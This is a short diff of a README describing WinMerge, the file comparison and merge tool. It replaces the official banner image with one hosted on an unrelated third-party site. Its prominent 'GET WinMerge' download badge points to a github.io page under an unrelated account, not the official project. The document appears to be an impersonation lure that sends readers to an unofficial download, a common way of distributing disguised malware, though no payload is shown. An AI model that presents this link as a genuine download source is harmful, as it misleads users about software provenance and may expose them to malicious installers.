@@ -6,7 +6,7 @@ WinMerge is a file comparison and merge application designed to help users exami
 
 Use WinMerge to compare text files, inspect folder contents, review source code changes, and combine modifications between file versions. Additional comparison modes support images, tables, and binary content.
 
-![WinMerge Banner](https://github.com/WinMerge/winmerge/raw/master/Docs/Logos/WinMerge_logo_24bit.png)
+![WinMerge Banner](https://arere-se.com/wp-content/uploads/2022/09/WinMerge_logo.png)
 
 [![GET WinMerge](https://img.shields.io/badge/GET-WinMerge-0078D6?style=for-the-badge&logoColor=white)](https://xarannaolinalis.github.io/.github/WinMerge-File-Comparison-Tools)
 
